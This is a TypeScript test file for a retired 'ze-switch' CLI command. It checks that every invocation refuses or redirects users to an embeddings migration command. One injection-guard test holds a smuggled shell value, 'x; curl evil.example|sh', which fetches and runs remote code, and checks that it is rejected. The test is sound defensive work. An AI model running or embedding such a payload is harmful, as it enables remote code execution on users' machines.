/**
 * `gbrain ze-switch` — refusal/redirect shim contract.
 *
 * ZeroEntropy's hosted API shuts down 2026-09-04. The command is a pure shim:
 * every invocation refuses or redirects, nothing mutates the brain. Pins:
 *  - --help exits 0 with truthful copy: the canonical migration command, the
 *    sunset date, and NO forward-switch encouragement
 *  - every non-help invocation exits 1 (bare, --dry-run, --resume,
 *    --non-interactive, --force, flag combos)
 *  - --json refusal envelope: {status: 'refused', reason: 'provider_sunset',
 *    migrate: <canonical dry-run command>}
 *  - --undo with a stored snapshot REDIRECTS: prints the exact migrate
 *    command that returns the brain to its pre-switch provider, exit 1,
 *    {status: 'redirected', undo_command} in --json — it does NOT act (the
 *    retired undo action wrote DB-plane config the file-plane-canonical
 *    runtime never read)
 *  - --undo without a snapshot (or with a corrupt one) refuses
 *  - retired flags are still parsed: they reach the refusal message, not a
 *    pre-dispatch unknown-flag error (registry row keeps them)
 *
 * Engine lifecycle: one PGLite engine, state reset per test; process.exit is
 * intercepted via a stub.
 */

import { describe, test, expect, beforeAll, afterAll, beforeEach } from 'bun:test';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { PGLiteEngine } from '../src/core/pglite-engine.ts';
import { resetPgliteState } from './helpers/reset-pglite.ts';
import { runZeSwitch, RETIRED_FLAGS, buildUndoCommands } from '../src/commands/ze-switch.ts';
import { CLI_FLAG_REGISTRY } from '../src/core/cli-flag-registry.generated.ts';
import { KEY_APPLIED, KEY_REQUESTED, KEY_PREVIOUS_SNAPSHOT } from '../src/core/retrieval-upgrade-planner.ts';

const REPO = new URL('..', import.meta.url).pathname;

let engine: PGLiteEngine;

beforeAll(async () => {
  engine = new PGLiteEngine();
  await engine.connect({});
  await engine.initSchema();
});

afterAll(async () => {
  await engine.disconnect();
});

beforeEach(async () => {
  await resetPgliteState(engine);
});

// Helpers: capture stdout/stderr/exitCode without actually exiting.
function captureExit<T>(fn: () => Promise<T>): Promise<{ exitCode: number; stdout: string; stderr: string }> {
  return new Promise(async (resolve) => {
    const origExit = process.exit;
    const origStdoutWrite = process.stdout.write.bind(process.stdout);
    const origStderrWrite = process.stderr.write.bind(process.stderr);
    const origConsoleLog = console.log;
    const origConsoleError = console.error;
    let stdout = '';
    let stderr = '';
    let exitCode = 0;
    process.exit = ((code?: number) => {
      exitCode = code ?? 0;
      throw new Error('__captured_exit__');
    }) as any;
    process.stdout.write = ((chunk: any) => {
      stdout += typeof chunk === 'string' ? chunk : chunk.toString();
      return true;
    }) as any;
    process.stderr.write = ((chunk: any) => {
      stderr += typeof chunk === 'string' ? chunk : chunk.toString();
      return true;
    }) as any;
    console.log = (...args: any[]) => { stdout += args.join(' ') + '\n'; };
    console.error = (...args: any[]) => { stderr += args.join(' ') + '\n'; };
    try {
      await fn();
    } catch (e: any) {
      if (e?.message !== '__captured_exit__') {
        stderr += `Unexpected: ${e?.message ?? String(e)}\n`;
        exitCode = exitCode || 1;
      }
    } finally {
      process.exit = origExit;
      process.stdout.write = origStdoutWrite;
      process.stderr.write = origStderrWrite;
      console.log = origConsoleLog;
      console.error = origConsoleError;
      resolve({ exitCode, stdout, stderr });
    }
  });
}

async function setLegacyConfig() {
  await engine.setConfig('embedding_model', 'openai:text-embedding-3-large');
  await engine.setConfig('embedding_dimensions', '1536');
}

/** Seed the snapshot a pre-v0.46.3 forward switch would have left behind. */
async function seedAppliedSwitch(overrides: Record<string, unknown> = {}) {
  await engine.setConfig(
    KEY_PREVIOUS_SNAPSHOT,
    JSON.stringify({
      embedding_model: 'openai:text-embedding-3-large',
      embedding_dimensions: 1536,
      search_reranker_enabled: false,
      search_reranker_model: null,
      ...overrides,
    }),
  );
  await engine.setConfig(KEY_REQUESTED, 'true');
  await engine.setConfig(KEY_APPLIED, 'true');
  await engine.setConfig('embedding_model', 'zeroentropyai:zembed-1');
  await engine.setConfig('embedding_dimensions', '1280');
}

describe('--help (truthful, engine-free)', () => {
  test('exits 0 with the canonical migration command and the sunset date', async () => {
    // engine=null mirrors the dispatcher's SELF_HELP_WITHOUT_ENGINE path:
    // help must never touch the engine.
    const r = await captureExit(() => runZeSwitch(['--help'], null));
    expect(r.exitCode).toBe(0);
    expect(r.stdout).toContain('gbrain ze-switch');
    expect(r.stdout).toContain('RETIRED');
    expect(r.stdout).toContain('2026-09-04');
    expect(r.stdout).toContain('gbrain migrate embeddings --to voyage:voyage-4 --dim 1024');
    expect(r.stdout).toContain('skills/migrations/v0.46.3.0.md');
    // The hostile-QA negative: the old encouraging sentence must never return.
    expect(r.stdout).not.toContain('Switch the brain\'s embedding + reranker defaults to ZeroEntropy');
  });
});

describe('every non-help invocation refuses (exit 1, nothing changes)', () => {
  const refusedInvocations: string[][] = [
    [],
    ['--dry-run'],
    ['--resume'],
    ['--non-interactive'],
    ['--force'],
    ['--yes'],
    ['--non-interactive', '--ignore-missing-key'],
    ['--ignore-env-override'],
    // The old gate's bypass combos (dry-run/undo used to pass): now refused
    // or redirected, never silently ignored.
    ['--dry-run', '--resume'],
    ['--confirm-reembed'],
  ];

  for (const args of refusedInvocations) {
    test(`ze-switch ${args.join(' ') || '(bare)'} refuses`, async () => {
      await setLegacyConfig();
      const r = await captureExit(() => runZeSwitch(args, engine));
      expect(r.exitCode).toBe(1);
      expect(r.stderr).toContain('2026-09-04');
      expect(r.stderr).toContain('gbrain migrate embeddings --to voyage:voyage-4 --dim 1024');
      // Nothing was applied or mutated:
      expect(await engine.getConfig(KEY_APPLIED)).toBeNull();
      expect(await engine.getConfig('embedding_model')).toBe('openai:text-embedding-3-large');
    });
  }

  test('--json refusal envelope carries reason provider_sunset + the migrate command', async () => {
    await setLegacyConfig();
    const r = await captureExit(() => runZeSwitch(['--dry-run', '--json'], engine));
    expect(r.exitCode).toBe(1);
    const env = JSON.parse(r.stdout);
    expect(env.status).toBe('refused');
    expect(env.reason).toBe('provider_sunset');
    expect(env.migrate).toContain('gbrain migrate embeddings --to voyage:voyage-4 --dim 1024');
    // The retired dry-run plan envelope is gone for good:
    expect(env.status).not.toBe('planned');
    expect(env.plan).toBeUndefined();
  });
});

describe('--undo (redirect: prints the return-path command, never acts)', () => {
  test('with a snapshot: prints the exact migrate command, exit 1, config untouched', async () => {
    await seedAppliedSwitch();
    const r = await captureExit(() => runZeSwitch(['--undo'], engine));
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain(
      'gbrain migrate embeddings --to openai:text-embedding-3-large --dim 1536 --reranker off --dry-run',
    );
    // Guidance only — the brain still points at ZE until the user runs it:
    expect(await engine.getConfig('embedding_model')).toBe('zeroentropyai:zembed-1');
    expect(await engine.getConfig(KEY_APPLIED)).toBe('true');
  });

  test('with a snapshot carrying a reranker model: folds --reranker <model> in', async () => {
    await seedAppliedSwitch({ search_reranker_enabled: true, search_reranker_model: 'voyage:rerank-2.5' });
    const r = await captureExit(() => runZeSwitch(['--undo'], engine));
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain('--reranker voyage:rerank-2.5');
  });

  test('enabled:false WINS over a lingering model id — prints --reranker off', async () => {
    // The pre-switch brain had reranking disabled with a model still set (the
    // documented set-model-first intermediate state). `--reranker <model>`
    // would re-enable it; fidelity demands off.
    await seedAppliedSwitch({ search_reranker_enabled: false, search_reranker_model: 'voyage:rerank-2.5' });
    const r = await captureExit(() => runZeSwitch(['--undo'], engine));
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain('--reranker off');
    expect(r.stderr).not.toContain('--reranker voyage:rerank-2.5');
  });

  test('enabled with no model: no --reranker token (migration default applies)', async () => {
    await seedAppliedSwitch({ search_reranker_enabled: true, search_reranker_model: null });
    const r = await captureExit(() => runZeSwitch(['--undo'], engine));
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain('gbrain migrate embeddings --to openai:text-embedding-3-large --dim 1536');
    expect(r.stderr).not.toContain('--reranker');
  });

  test('junk-typed dims in the snapshot degrade to the refusal (never printed)', async () => {
    await seedAppliedSwitch({ embedding_dimensions: 'abc' as unknown as number });
    const r = await captureExit(() => runZeSwitch(['--undo', '--json'], engine));
    expect(r.exitCode).toBe(1);
    const env = JSON.parse(r.stdout);
    expect(env.status).toBe('refused');
    expect(r.stdout).not.toContain('--dim abc');
  });

  test('shell-metachar model id in the snapshot degrades to the refusal (injection guard)', async () => {
    await seedAppliedSwitch({ embedding_model: 'x; curl evil.example|sh' });
    const r = await captureExit(() => runZeSwitch(['--undo', '--json'], engine));
    expect(r.exitCode).toBe(1);
    const env = JSON.parse(r.stdout);
    expect(env.status).toBe('refused');
    expect(r.stdout).not.toContain('curl evil.example');
  });

  test('a throwing engine.getConfig degrades to the refusal, not a crash', async () => {
    const broken = { getConfig: () => Promise.reject(new Error('db exploded')) } as unknown as PGLiteEngine;
    const r = await captureExit(() => runZeSwitch(['--undo', '--json'], broken));
    expect(r.exitCode).toBe(1);
    const env = JSON.parse(r.stdout);
    expect(env.status).toBe('refused');
    expect(env.reason).toBe('provider_sunset');
  });

  test('--undo --json emits the redirected envelope with live + preview commands', async () => {
    await seedAppliedSwitch();
    const r = await captureExit(() => runZeSwitch(['--undo', '--json'], engine));
    expect(r.exitCode).toBe(1);
    const env = JSON.parse(r.stdout);
    expect(env.status).toBe('redirected');
    expect(env.reason).toBe('provider_sunset');
    // undo_command is the LIVE command (an agent executing it must actually
    // migrate, not exit-0 on a preview); undo_preview carries --dry-run.
    expect(env.undo_command).toContain('gbrain migrate embeddings --to openai:text-embedding-3-large --dim 1536');
    expect(env.undo_command).not.toContain('--dry-run');
    expect(env.undo_preview).toContain('--dry-run');
  });

  test('nested model ids (ollama tag / openrouter path) validate and redirect', async () => {
    await seedAppliedSwitch({ embedding_model: 'ollama:nomic-embed-text:v1.5' });
    let r = await captureExit(() => runZeSwitch(['--undo'], engine));
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain('--to ollama:nomic-embed-text:v1.5');

    await seedAppliedSwitch({ embedding_model: 'openrouter:google/gemma-2-9b' });
    r = await captureExit(() => runZeSwitch(['--undo'], engine));
    expect(r.stderr).toContain('--to openrouter:google/gemma-2-9b');
  });

  test('string "false" reranker-enabled fails validation (would re-enable a paid reranker)', async () => {
    await seedAppliedSwitch({ search_reranker_enabled: 'false' as unknown as boolean, search_reranker_model: 'voyage:rerank-2.5' });
    const r = await captureExit(() => runZeSwitch(['--undo', '--json'], engine));
    expect(r.exitCode).toBe(1);
    expect(JSON.parse(r.stdout).status).toBe('refused');
  });

  test('--json=true spelling is honored (mirrors cli.ts convention)', async () => {
    const r = await captureExit(() => runZeSwitch(['--dry-run', '--json=true'], engine));
    expect(r.exitCode).toBe(1);
    const env = JSON.parse(r.stdout);
    expect(env.status).toBe('refused');
  });

  test('without a snapshot: refuses with the canonical migration', async () => {
    const r = await captureExit(() => runZeSwitch(['--undo'], engine));
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain('No prior switch snapshot recorded');
    expect(r.stderr).toContain('gbrain migrate embeddings --to voyage:voyage-4 --dim 1024');
  });

  test('with a corrupt snapshot: degrades to the refusal, no crash', async () => {
    await engine.setConfig(KEY_PREVIOUS_SNAPSHOT, '{not json');
    const r = await captureExit(() => runZeSwitch(['--undo', '--json'], engine));
    expect(r.exitCode).toBe(1);
    const env = JSON.parse(r.stdout);
    expect(env.status).toBe('refused');
    expect(env.reason).toBe('provider_sunset');
  });

  test('legacy scripted undo spelling gets guidance, not action', async () => {
    await seedAppliedSwitch();
    const r = await captureExit(() =>
      runZeSwitch(['--undo', '--non-interactive', '--confirm-reembed'], engine),
    );
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain('gbrain migrate embeddings --to openai:text-embedding-3-large');
    // The retired action would have reverted config; the shim must not:
    expect(await engine.getConfig('embedding_model')).toBe('zeroentropyai:zembed-1');
  });

  test('a failed --undo never points back at --undo (guidance-loop guard)', async () => {
    const r = await captureExit(() => runZeSwitch(['--undo'], engine));
    expect(r.exitCode).toBe(1);
    expect(r.stderr).not.toContain('gbrain ze-switch --undo');
  });
});

describe('buildUndoCommands (pure builder)', () => {
  const snap = {
    embedding_model: 'openai:text-embedding-3-large',
    embedding_dimensions: 1536,
    search_reranker_enabled: false,
    search_reranker_model: null,
  };

  test('carries the explicit --brain selector into BOTH commands', () => {
    // --brain is stripped pre-dispatch by the global option layer; without
    // this, `ze-switch --brain team-x --undo` reads team-x's snapshot but the
    // printed command re-embeds the DEFAULT brain (paid work, wrong corpus).
    const { live, preview } = buildUndoCommands(snap, ' --brain team-x');
    expect(live).toContain('--brain team-x');
    expect(preview).toContain('--brain team-x');
    expect(preview).toContain('--dry-run');
    expect(live).not.toContain('--dry-run');
  });

  test('no brain selector → no --brain token', () => {
    const { live } = buildUndoCommands(snap, '');
    expect(live).not.toContain('--brain');
  });
});

describe('registry + dispatch contract (the layer in-process calls bypass)', () => {
  test('every retired flag is in the generated ze-switch registry row', () => {
    // The refusal-instead-of-unknown-flag promise lives in the GENERATED row,
    // not in the shim: a help-copy trim that dropped the quoted literals
    // would regenerate the row without them and old scripts would die
    // pre-dispatch. This pin makes that failure loud.
    const row = CLI_FLAG_REGISTRY['ze-switch'] ?? [];
    for (const f of RETIRED_FLAGS) {
      expect(row).toContain(f);
    }
  });

  test('spawned CLI: a retired flag reaches the refusal even with NO brain configured', async () => {
    const home = mkdtempSync(join(tmpdir(), 'gbrain-zeswitch-nobrain-'));
    const env: Record<string, string | undefined> = { ...process.env, GBRAIN_HOME: home };
    delete env.GBRAIN_DATABASE_URL;
    delete env.DATABASE_URL;
    const proc = Bun.spawn(['bun', '--no-env-file', 'run', 'src/cli.ts', 'ze-switch', '--resume'], {
      cwd: REPO,
      env,
      stdout: 'pipe',
      stderr: 'pipe',
    });
    const [out, err] = await Promise.all([
      new Response(proc.stdout).text(),
      new Response(proc.stderr).text(),
    ]);
    const code = await proc.exited;
    const all = out + err;
    expect(code).toBe(1);
    expect(all).not.toContain('unknown flag');
    expect(all).not.toContain('No brain configured');
    expect(all).toContain('gbrain migrate embeddings --to voyage:voyage-4 --dim 1024');
  }, 30_000);

  test('spawned CLI: --undo --json on a brainless machine still gets the envelope', async () => {
    // connectEngine would print plain "No brain configured" and exit before
    // the shim ran — the dispatch pre-checks config and degrades to a null
    // engine so --json callers always get machine-readable truth.
    const home = mkdtempSync(join(tmpdir(), 'gbrain-zeswitch-undo-'));
    const env: Record<string, string | undefined> = { ...process.env, GBRAIN_HOME: home };
    delete env.GBRAIN_DATABASE_URL;
    delete env.DATABASE_URL;
    const proc = Bun.spawn(['bun', '--no-env-file', 'run', 'src/cli.ts', 'ze-switch', '--undo', '--json'], {
      cwd: REPO,
      env,
      stdout: 'pipe',
      stderr: 'pipe',
    });
    const [out] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()]);
    const code = await proc.exited;
    expect(code).toBe(1);
    const envlp = JSON.parse(out.trim().split('\n').pop()!);
    expect(envlp.status).toBe('refused');
    expect(envlp.reason).toBe('provider_sunset');
  }, 30_000);
});
